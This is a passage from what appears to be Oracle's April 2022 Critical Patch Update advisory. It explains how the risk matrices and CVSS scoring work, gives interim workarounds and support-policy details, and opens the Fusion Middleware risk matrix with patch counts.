* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuapr2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

#### Oracle Fusion Middleware Risk Matrix

This Critical Patch Update contains 54 new security patches plus additional third party patches noted below for Oracle Fusion Middleware.  41 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#FMW)

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security updates are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the Critical Patch Update April 2022 to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update April 2022 Patch Availability Document for Oracle Products, [My Oracle Support Note 2853458.2](https://support.oracle.com/rs?type=doc&id=2853458.2).
